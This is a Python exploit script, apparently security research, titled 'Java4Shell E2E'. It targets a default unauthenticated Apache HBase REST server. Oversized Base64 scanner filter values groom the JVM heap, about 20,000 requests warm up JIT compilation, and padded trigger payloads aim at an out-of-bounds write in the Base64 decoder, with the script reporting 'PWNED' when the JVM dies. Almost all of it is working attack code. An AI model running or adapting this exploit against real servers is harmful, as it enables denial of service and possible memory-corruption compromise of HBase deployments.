#!/usr/bin/env python3
"""Java4Shell E2E against REAL app: Apache HBase REST (Stargate), default install.

Surface: POST /{table}/scanner -> ScannerModel.buildComparator ->
         java.util.Base64.getDecoder().decode(value)   [ScannerModel.java:219]
         - standard alphabet, padding allowed, no body size cap, no auth (default).
Groom primitives map to scanner lifecycle (default cache TTL = 1h, size 10000):
  fill   = create scanner with 7MB BinaryComparator value (5MB live humongous)
  drop   = DELETE /test/scanner/{id}
  cycle  = driven by fill allocations themselves (observed in prior E2E) + gc.log poll
  trigger= scanner create with padded tail ("A"*4k+"==") -> 62B OOB write -> JVM death
"""
import json, re, sys, time, urllib.request, urllib.error

BASE = "http://127.0.0.1:8080"
GCLOG = "/share/gc-rest.log"
CYCLE = re.compile(r"Concurrent Mark Cycle .*ms")

def req(method, path, data=None, timeout=180):
    r = urllib.request.Request(BASE + path, data=data, method=method,
                               headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)
    except Exception as e:
        return -1, str(e), {}

def value_bytes(tail):
    k = 1747620 if tail == "AB" else 1747616   # fill: dst 5242861 (5R) / trigger: dst 5242849
    return ("A" * (4 * k)) + tail

def body_str(hdr):
    return str(hdr.get("Body", ""))[:120]

def scanner_body(value):
    # ScannerModel.FilterModel: RowFilter carries a comparator; buildComparator()
    # decodes comparator.value with java.util.Base64.getDecoder() (the intrinsic path)
    inner = json.dumps({"type": "RowFilter", "op": "EQUAL",
                        "comparator": {"type": "BinaryComparator", "value": value}})
    return json.dumps({"filter": inner}).encode("latin-1")

def cycles():
    try:
        return len(CYCLE.findall(open(GCLOG, errors="ignore").read()))
    except OSError:
        return -1

def wait_cycle(before, timeout, pump=True):
    deadline = time.time() + timeout
    while time.time() < deadline:
        now = cycles()
        if now > before:
            return now
        time.sleep(1)
    return before

def alive():
    return req("GET", "/version", timeout=5)[0] == 200

print("═══ Java4Shell E2E → Apache HBase REST (default install) ═══", flush=True)
for _ in range(30):
    if alive():
        break
    time.sleep(2)
print("[0] victim version:", req("GET", "/version")[1].strip()[:200], flush=True)

# [W] C2 warmup — the intrinsic fires only from TIER-4-compiled decode0 (the caller).
# A default-install HBase REST JVM never decodes 10K+ times on its own; observed run
# compiled only decodeBlock (no intrinsic). ~20K scanner creates/deletes of SMALL
# valid filters push decode0 past the tiered threshold, interleaving all decode0
# branch shapes so the trigger's slow path doesn't deopt it (same fix as OobCanary).
shapes = [
    "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=",
    ("A" * 4096) + "AB",
    ("A" * 4096) + "ABC",
    ("A" * 4096) + "AB==",
]
print("[W] warmup decode0 (20K small scanners)...", flush=True)
for i in range(20000):
    code, _, hdr = req("POST", "/test/scanner", scanner_body(shapes[i & 3]))
    if code == 201:
        loc = hdr.get("Location")
        if loc:
            req("DELETE", loc)
    elif i == 0:
        print("[W] warmup shape rejected: %s %s" % (code, body_str(hdr)), flush=True)
    if i % 5000 == 0 and i:
        print("[W] warmup %d..." % i, flush=True)
print("[W] warmup done", flush=True)

fill_v  = value_bytes("AB")
trig_v  = value_bytes("==")
body_f  = scanner_body(fill_v)
body_t  = scanner_body(trig_v)
print("[1] payloads: fill=%dB trig=%dB" % (len(body_f), len(body_t)), flush=True)

ids = []
for i in range(140):
    code, body, hdr = req("POST", "/test/scanner", body_f)
    if code != 201:
        print("[2] fill %d FAILED: %s %s" % (i, code, body[:200]), flush=True)
        sys.exit(1)
    ids.append(hdr.get("Location") or body)
    if i % 35 == 0:
        print("[2] fill %d ok (%s)" % (i, cycles()), flush=True)
print("[2] 140 scanners live (fillers, default TTL=1h)", flush=True)

c0 = cycles()
print("[3] GC cycles before=%d" % c0, flush=True)
c1 = wait_cycle(c0, 240)
print("[3] cycle: %d -> %d" % (c0, c1), flush=True)

print("[4] dropping filler #70: DELETE", ids[70], flush=True)
req("DELETE", ids[70])
c2 = wait_cycle(c1, 240)
print("[5] reclaim cycle: %d -> %d" % (c1, c2), flush=True)

print("[6] firing trigger scanners x5 (first lands in the hole)", flush=True)
for t in range(1, 6):
    code, body, _ = req("POST", "/test/scanner", body_t)
    print("[6] trigger %d -> HTTP %s %s" % (t, code, body[:120]), flush=True)
    # drive concurrent cycles so G1 CM touches the smashed header (crash may be delayed)
    for p in range(8):
        req("POST", "/test/scanner", body_f)
    time.sleep(10)
    if not alive():
        print("★★★ HBASE REST JVM DEAD after trigger %d ★★★" % t, flush=True)
        print("VERDICT: PWNED", flush=True)
        sys.exit(42)

for w in range(60):
    time.sleep(5)
    for p in range(2):  # keep humongous churn driving cycles
        try:
            req("POST", "/test/scanner", body_f, timeout=30)
        except Exception:
            pass
    if not alive():
        print("★★★ HBASE REST JVM DEAD (delayed watch %d) ★★★" % w, flush=True)
        print("VERDICT: PWNED-DELAYED", flush=True)
        sys.exit(42)
print("VERDICT: SURVIVED (victim alive after full protocol)", flush=True)
sys.exit(0)
